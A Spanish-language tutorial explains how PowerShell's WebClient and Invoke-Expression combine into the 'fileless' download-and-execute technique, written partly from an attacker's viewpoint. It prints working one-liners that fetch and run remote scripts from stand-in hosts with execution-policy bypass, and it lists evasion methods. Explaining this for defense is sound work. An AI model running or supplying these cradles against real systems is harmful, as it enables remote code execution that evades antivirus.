
---

# 1️⃣ New-Object Net.WebClient

```powershell
New-Object Net.WebClient
```

Esto crea una instancia de la clase:

```
System.Net.WebClient
```

Que pertenece a .NET y sirve para:

* Enviar peticiones HTTP
* Descargar contenido
* Subir datos
* Manejar cabeceras

Equivale conceptualmente a:

> “Dame un cliente HTTP simple”

Ejemplo:

```powershell
$wc = New-Object Net.WebClient
```

Ahora `$wc` es un objeto con métodos.

---

# 2️⃣ DownloadString()

```powershell
$wc.DownloadString("http://servidor/payload.ps1")
```

Qué hace:

* Envía GET
* Descarga el contenido
* Devuelve **texto**

No guarda archivo.
Solo devuelve una cadena en memoria.

Resultado:

```powershell
"Write-Host 'Hola'"
```

---

# 3️⃣ DownloadFile()

```powershell
$wc.DownloadFile("http://servidor/payload.exe", "C:\temp\evil.exe")
```

Qué hace:

* Descarga
* Guarda en disco

Resultado:

Archivo físico.

---

# 4️⃣ Invoke-Expression (IEX)

```powershell
Invoke-Expression "Write-Host Hola"
```

o abreviado:

```powershell
IEX "Write-Host Hola"
```

Función:

👉 Toma una cadena y la ejecuta como código PowerShell.

Es como:

> “Interpreta este texto como si el usuario lo hubiese escrito”.

---

# 5️⃣ El combo clásico (fileless)

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://servidor/payload.ps1")
```

Paso a paso:

1. Se crea WebClient
2. Se descarga texto
3. Ese texto se pasa a IEX
4. PowerShell ejecuta el contenido directamente

Nada toca disco.

---

# 6️⃣ Qué ocurre internamente

Flujo real:

```
powershell.exe
  └─ CLR (.NET runtime)
       └─ WebClient → HTTP GET
             └─ Respuesta (string)
                  └─ PowerShell Parser
                        └─ ScriptBlock
                              └─ Ejecución
```

Nunca se crea archivo.

Por eso se llama:

👉 **Fileless execution**

---

# 7️⃣ Diferencia entre DownloadString vs DownloadFile

| Método         | Resultado        | Rastros |
| -------------- | ---------------- | ------- |
| DownloadString | Texto en RAM     | Menos   |
| DownloadFile   | Archivo en disco | Más     |

Desde ofensiva:

* Preferido: `DownloadString`

Desde defensa:

* DownloadString = más peligroso

---

# 8️⃣ Por qué IEX es tan usado

Porque PowerShell **no ejecuta strings automáticamente**.

Esto NO funciona:

```powershell
"Write-Host Hola"
```

Necesitas algo que lo interprete.

Opciones:

```powershell
IEX
Invoke-Command
ScriptBlock::Create()
```

Pero IEX es corto.

---

# 9️⃣ Encadenamiento mental del atacante

Objetivo:

> Obtener ejecución arbitraria sin tocar disco.

Ruta:

```
Internet → Memoria → Parser → Ejecución
```

Evita:

* Antivirus tradicionales
* Políticas de ejecución
* Controles basados en archivos

---

# 🔟 Ejemplo realista

Servidor atacante:

```powershell
Write-Host "Conectado"
Start-Sleep 9999
```

Víctima:

```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://x.x.x.x/a.ps1')"
```

Una sola línea = ejecución completa.

---

# 1️⃣1️⃣ Nivel defensivo (muy importante)

Hoy en día los EDR detectan:

* Uso de IEX
* DownloadString
* Combinaciones sospechosas
* AMSI inspecciona el contenido

Por eso los atacantes:

* Ofuscan
* Cargan base64
* Usan reflection
* Abusan de .NET directamente

Pero el **principio base es el mismo**.

---

# 🧠 Idea clave que debes quedarte

PowerShell no es peligroso por sí mismo.
Es peligroso porque:

👉 Puede **convertir texto en código**.

Y cualquier sistema que haga eso siempre será un objetivo.

---

# 📌 Resumen ultra corto

* `New-Object Net.WebClient` → cliente web
* `DownloadString()` → descarga texto
* `DownloadFile()` → guarda archivo
* `IEX` → ejecuta texto

Combinados:

👉 Descarga + Ejecuta en memoria.

---
